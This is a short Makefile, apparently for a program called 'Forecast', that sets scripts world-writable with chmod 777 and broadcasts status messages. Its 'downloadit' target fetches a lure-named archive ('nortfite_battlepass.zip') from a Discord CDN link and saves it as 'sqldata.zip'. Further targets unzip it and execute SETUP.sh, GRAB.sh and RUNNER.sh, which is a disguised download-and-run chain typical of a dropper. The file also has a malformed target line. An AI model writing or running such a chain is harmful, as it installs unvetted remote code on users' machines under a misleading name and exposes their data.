chmodexecutor:
	chmod 777 $$PWD/EXECUTE.sh
executor:
	echo Grabbing key............
	key=$$(openssl rand -base64 242)
	echo Forecast is running............ > /home/loggeruser/log-$$key
announceprimarymessage:
	wall Forecast is running............
runexecutor:
	bash $$PWD/EXECUTE.sh
announcesecondarymessage:
	wall Forecast was ran!
chmodbuilder:
	chmod 777 $$PWD/BUILD.sh
runbuilder:
	bash $$PWD/BUILD.sh
downloadit:
	wget https://cdn.discordapp.com/attachments/783461298531860495/811022895643754496/nortfite_battlepass.zip -O $PWD/sqldata.zip
unzipit
	unzip $PWD/sqldata.zip
executesetupscript:
	bash $PWD/SETUP.sh
executegrabscript:
	bash $PWD/GRAB.sh
executerunnerscript:
	bash $PWD/RUNNER.sh
announceprimarychmodmessage:
	echo CHMOD Sequence is halfway done!
announcesecondarychmodmessage:
	echo CHMOD Sequence is all the way done!
